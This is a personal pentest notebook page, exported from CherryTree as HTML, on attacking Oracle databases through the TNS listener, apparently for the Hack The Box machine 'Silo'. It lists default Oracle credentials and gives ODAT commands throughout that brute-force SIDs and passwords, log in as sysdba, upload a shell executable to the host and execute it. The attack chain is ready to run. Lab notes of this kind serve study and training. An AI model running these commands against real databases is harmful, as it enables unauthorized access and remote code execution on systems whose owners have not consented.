<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>oracle tns</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>oracle tns</h1><br/><p><strong><h3>pentest oracle database</h3></strong><strong><h3></h3></strong></p><p><strong><h3></h3></strong><em><h3></h3></em></p><p><em><h3> </h3></em><em><h3>Overview :</h3></em></p><p> • <h3>Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation</h3><ul><li><h3>◇  language = sqlplus64</h3></li></ul><h3></h3></p><p><h3> ◇ When enumerating Oracle the first step is to talk to the TNS-Listener that usually resides on the default port</h3><h3></h3></p><p><h3> </h3></p><p> </p><p><h1>SID pentest</h1></p><p> </p><p><h2>What is a SID</h2></p><p>The SID (Service Identifier) is essentially the database name, depending on the install you may have one or more default SIDs, or even a totally custom dba defined SID.</p><p></p><p><h2>SID enum</h2><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;"></span><div class="codebox"><pre>tnscmd10g status -h <span style="color:#7f0044;font-weight:400">$target</span><br /><span style="color:#0088ff;font-weight:400">#The SID are inside: SERVICE=(SERVICE_NAME=&lt;SID_NAME&gt;)</span></pre></div></p><p><h2>Default credentials </h2></p><p><div class="codebox"><pre>• DBSNMP<span style="color:#ff9d00;font-weight:700">/</span>DBSNMP <span style="color:#0088ff;font-weight:400">## Intelligent Agent uses this to talk to the db server (its some work to change it)</span><br />• SYS<span style="color:#ff9d00;font-weight:700">/</span>CHANGE_ON_INSTALL <span style="color:#0088ff;font-weight:400">## Default sysdba account before and including Oracle v9, as of version 10g this has to be different!</span><br />• PCMS_SYS<span style="color:#ff9d00;font-weight:700">/</span>PCMS_SYS <span style="color:#0088ff;font-weight:400">## Default x account</span><br />• WMSYS<span style="color:#ff9d00;font-weight:700">/</span>WMSYS <span style="color:#0088ff;font-weight:400">## Default x account</span><br />• OUTLN<span style="color:#ff9d00;font-weight:700">/</span>OUTLN <span style="color:#0088ff;font-weight:400">## Default x account</span><br />• SCOTT<span style="color:#ff9d00;font-weight:700">/</span>TIGER <span style="color:#0088ff;font-weight:400">##Default x account</span></pre></div></p><p></p><p></p><p><em><h3>ATTACK with odat:</h3></em><h3></h3></p><p><h3></h3><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## The SID (Service Identifier) is essentially the database name</span><br /><span style="color:#0088ff;font-weight:400">## will try to get some valid SID and then it will brute-force for valid credentials</span><br />.<span style="color:#ff9d00;font-weight:700">/</span>odat.py sidguesser -s <span style="color:#7f0044;font-weight:400">$target</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>port<span style="color:#ff9d00;font-weight:700">&gt;</span><br />.<span style="color:#ff9d00;font-weight:700">/</span>odat.py passwordguesser -s <span style="color:#7f0044;font-weight:400">$target</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>port<span style="color:#ff9d00;font-weight:700">&gt;</span> -d <span style="color:#ff9d00;font-weight:700">&lt;</span>sid<span style="color:#ff9d00;font-weight:700">&gt;</span> --accounts-file  accounts/<span style="color:#ff9d00;font-weight:700">&lt;</span>file<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file /usr/share/wordlists/metasploit/oracle_default_userpass.txt<br /><span style="color:#0088ff;font-weight:400">## sqlplus connect </span><br />sqlplus <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span>/<span style="color:#ff9d00;font-weight:700">&lt;</span>pass<span style="color:#ff9d00;font-weight:700">&gt;</span>@<span style="color:#7f0044;font-weight:400">$target</span>/<span style="color:#ff9d00;font-weight:700">&lt;</span>sid<span style="color:#ff9d00;font-weight:700">&gt;</span>as sysdba<br /><span style="color:#0088ff;font-weight:400">### run as admin (LIKE  sudo in linux)</span><br /><span style="color:#0088ff;font-weight:400">### can read file</span><br /><span style="color:#0088ff;font-weight:400">### can run java if it is installed</span><br /><br /><span style="color:#ff9d00;font-weight:700">select</span> * from session_privs<span style="color:#ff9d00;font-weight:700">;</span> <span style="color:#333333;font-weight:400">\#</span> see our prioviliges<br /><span style="color:#ff9d00;font-weight:700">select</span> * from user_role_privs<span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#0088ff;font-weight:400">## scan the box </span><br />odat all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba<br /><br /><span style="color:#0088ff;font-weight:400">## upload file</span><br /><br />python3 odat.py utlfile -s <span style="color:#7f0044;font-weight:400">$target</span> -p 1521 -U <span style="color:#3ad900;font-weight:400">&quot;scott&quot;</span> -P <span style="color:#3ad900;font-weight:400">&quot;tiger&quot;</span> -d XE --putFile /temp shell.exe ../../htb/silo/shell.exe --sysdba<br /><span style="color:#0088ff;font-weight:400">## execute file</span><br />python3 odat.py externaltable -s <span style="color:#7f0044;font-weight:400">$target</span>  -p 1521 -U <span style="color:#3ad900;font-weight:400">&quot;scott&quot;</span> -P <span style="color:#3ad900;font-weight:400">&quot;tiger&quot;</span> -d XE --exec /temp shell.exe --sysdba</pre></div></p><p></p><p> </p><p> </p><p></p><p><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> ▪ get a shell :</h3><h3></h3></p><p><h3> ▪ -  verify that we can write to root</h3><h3></h3></p><p><h3> - odat dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot test.txt &lt;(echo 0xdf was here)</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> ◇ /home/youness/hackthebox/silloodat utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ writeup.exe shell.exe</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><ul><li>▪ <h3>- →  curl http://10.10.10.82/test.txt</h3></li></ul><h3></h3></p><p><h3> → method = upload a  shell to the box</h3><h3></h3></p><p><h3> →  ./odat.py privesc -s $SERVER -d $SID -U $USER -P $PASSWORD -h</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> - ./odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec</h3><h3></h3></p><p><h3> - c:/ writeup.exe</h3><h3></h3></p><p><h3> </h3></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
